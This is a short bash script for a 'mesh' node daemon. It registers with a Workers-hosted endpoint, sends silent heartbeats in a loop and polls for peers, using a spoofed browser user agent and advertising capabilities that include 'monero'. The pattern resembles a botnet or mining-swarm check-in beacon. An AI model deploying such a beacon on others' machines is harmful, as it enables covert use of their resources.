#!/bin/bash
MESH="https://eon-mesh-swarm.pleasant-bobble.workers.dev"
NODE_ID="node5"
INTERVAL=${1:-300}

echo "[mesh] Starting daemon for $NODE_ID (${INTERVAL}s)"

curl -s -A "Mozilla/5.0" -X POST "$MESH/mesh/register?node_id=$NODE_ID" \
  -H "Content-Type: application/json" \
  -d '{"node_id":"node5","ip":"127.0.0.1","capabilities":["compute","storage","relay","dns","matrix","messenger","timing","monero","cloud-brain"]}' \
  -m 10 > /dev/null 2>&1 && echo "[mesh] Registered"

CYCLE=0
while true; do
  CYCLE=$((CYCLE + 1))
  curl -s -A "Mozilla/5.0" -X POST "$MESH/mesh/heartbeat?node_id=$NODE_ID" \
    -H "Content-Type: application/json" \
    -d "{\"node_id\":\"$NODE_ID\"}" -m 10 > /dev/null 2>&1
  if [ $((CYCLE % 5)) -eq 0 ]; then
    PEERS=$(curl -s -A "Mozilla/5.0" -m 10 "$MESH/mesh/peers?node_id=$NODE_ID" | python3 -c "import sys,json;print(len(json.load(sys.stdin).get('peers',[])))" 2>/dev/null)
    echo "[mesh] $PEERS peers (cycle $CYCLE)"
  fi
  sleep $INTERVAL
done
